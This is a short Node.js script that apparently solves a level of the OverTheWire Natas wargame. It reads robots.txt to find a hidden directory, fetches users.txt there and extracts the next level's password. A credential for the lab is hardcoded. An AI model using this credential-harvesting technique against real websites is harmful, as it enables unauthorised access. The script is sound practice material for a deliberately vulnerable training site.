#!/usr/bin/env node

const axios = require("axios");
const cheerio = require("cheerio");

const username = "natas3";
const password = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14";

const url = `http://${username}.natas.labs.overthewire.org`;

// The password is in the robots.txt file
let newUrl = `${url}/robots.txt`;
axios
  .get(newUrl, { auth: { username: username, password: password } })
  .then((res) => {
    const $ = cheerio.load(res.data);
    const re = /Disallow: \/(.*)/;
    return $.html().match(re)[1];
  })
  .then((route) => {
    let newUrl = `${url}/${route}/users.txt`;
    axios
      .get(newUrl, { auth: { username: username, password: password } })
      .then((res) => {
        const $ = cheerio.load(res.data);
        const re = /natas4:(.\w+)/;
        return $.html().match(re)[1];
      })
      .then((password) => {
        console.log(password);
      })
      .catch((err) => console.log(err));
  })
  .catch((err) => console.log(err));
